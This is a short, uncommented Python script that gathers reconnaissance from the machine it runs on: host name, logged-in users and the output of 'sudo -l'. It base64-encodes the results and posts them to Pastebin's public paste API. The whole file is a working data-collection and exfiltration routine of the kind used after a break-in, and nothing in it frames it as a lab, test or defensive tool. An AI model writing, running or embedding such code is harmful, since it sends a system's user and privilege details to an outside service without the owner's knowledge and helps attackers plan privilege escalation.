import requests
import subprocess
import base64

output = b''
command = subprocess.Popen('hostname',shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
stdout,stderr = command.communicate()
output +=b'Hostname:   \n'+stdout+b'\n'

command = subprocess.Popen('w',shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
stdout,stderr = command.communicate()
output += b'Logged in users:   \n'+stdout+b'\n'

command = subprocess.Popen('sudo -l',shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
stdout,stderr = command.communicate()
output +=b'Current User Privileges:   \n'+stdout+b'\n'


payload = {
	'api_dev_key':'',
	'api_paste_code':base64.b64encode(output),
	'api_option':'paste'
}
url = 'https://pastebin.com/api/api_post.php'
r = requests.post(url,data=payload)
print(r.text)
